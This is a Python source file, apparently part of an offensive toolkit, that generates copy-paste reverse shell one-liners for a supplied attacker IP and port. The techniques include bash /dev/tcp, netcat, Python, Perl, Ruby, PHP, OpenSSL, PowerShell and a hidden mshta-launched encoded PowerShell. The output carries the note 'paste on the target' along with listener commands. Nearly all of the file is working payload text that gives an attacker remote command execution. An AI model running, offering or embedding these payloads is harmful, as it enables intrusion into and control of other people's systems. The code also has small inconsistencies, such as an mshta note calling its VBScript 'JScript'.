"""Reverse shell payload generator (改造⑦-①).

Generates copy-paste one-liner reverse shells in several techs, plus a matching
local listener management (see listener.py). Pure text generation, no network.
"""
from typing import Any, Dict


def revshell_generate(ip: str, port: int = 4444, shell: str = "bash",
                      technique: str = "bash") -> Dict[str, Any]:
    port = int(port)
    if not ip:
        return {"success": False, "error": "attacker ip required"}
    t = (technique or shell).lower()
    payload = ""
    note = ""
    if t in ("bash", "sh"):
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif t == "nc":
        payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    elif t == "nc-e":
        payload = f"nc -e /bin/sh {ip} {port}"
    elif t == "python":
        payload = (f"python3 -c 'import socket,subprocess,os;"
                   f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   f"s.connect((\"{ip}\",{port}));"
                   f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   f"subprocess.call([\"/bin/sh\",\"-i\"])'")
    elif t in ("python-pty", "pentestmonkey"):
        technique = "pentestmonkey"
        payload = (f"python3 -c 'import socket,subprocess,os;"
                   f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   f"s.connect((\"{ip}\",{port}));"
                   f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   f"p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        note = "listener tip: python3 -c 'import pty;pty.spawn(\"/bin/bash\")' after catch"
    elif t == "perl":
        payload = ("perl -e 'use Socket;$i=\"" + ip + "\";$p=" + str(port) + ";"
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                   "if(connect(S,sockaddr_in($p,inet_aton($i))))"
                   "{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                   "exec(\"/bin/sh -i\");};'")
    elif t == "ruby":
        payload = (f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                   f"exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
    elif t == "php":
        payload = (f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    elif t == "openssl":
        payload = (f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s")
        note = "attacker-side listener: openssl req -x509 -newkey rsa:2048 -nodes -keyout k -out c -days 365 && openssl s_server -quiet -key k -cert c -port PORT"
    elif t == "mshta":
        payload = (f'mshta vbscript:Execute("CreateObject(\"Wscript.Shell\").Run \"powershell -NoP -NonI -W Hidden '
                   f'-enc {_b64_powershell(ip, port)}, vbHide")')
        note = "windows mshta (JScript) variant; requires base64 powershell"
    elif t == "powershell":
        payload = f"powershell -nop -c \"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object -TypeName Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    else:
        return {"success": False, "error": f"unknown technique {technique}; try bash/nc/python/perl/ruby/php/openssl/powershell/mshta"}
    return {
        "success": True,
        "ip": ip,
        "port": port,
        "technique": t,
        "payload": payload,
        "note": note or "paste on the target; start a matching listener first (listener_start)",
        "listener_hint": f"nc -lvnp {port}",
    }


def _b64_powershell(ip: str, port: int) -> str:
    import base64
    raw = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
           f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
           f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
           f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
           f"$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r+'PS> '),0,($r+'PS> ').Length)}}"
           f"$c.Close()")
    return base64.b64encode(raw.encode("utf-16le")).decode()